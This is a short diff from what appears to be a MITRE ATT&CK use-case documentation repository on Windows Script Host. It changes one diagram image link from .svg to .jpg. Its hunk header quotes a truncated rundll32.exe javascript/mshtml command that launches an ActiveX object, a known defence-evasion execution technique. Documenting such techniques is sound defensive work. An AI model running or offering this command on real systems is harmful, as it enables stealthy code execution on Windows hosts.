@@ -50,7 +50,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";new%20ActiveXObject("WS
 
       
 
-![Mermaid](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/WSH/Misc/Mermaid.svg)
+![Mermaid](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/WSH/Misc/Mermaid.jpg)
 
 
 
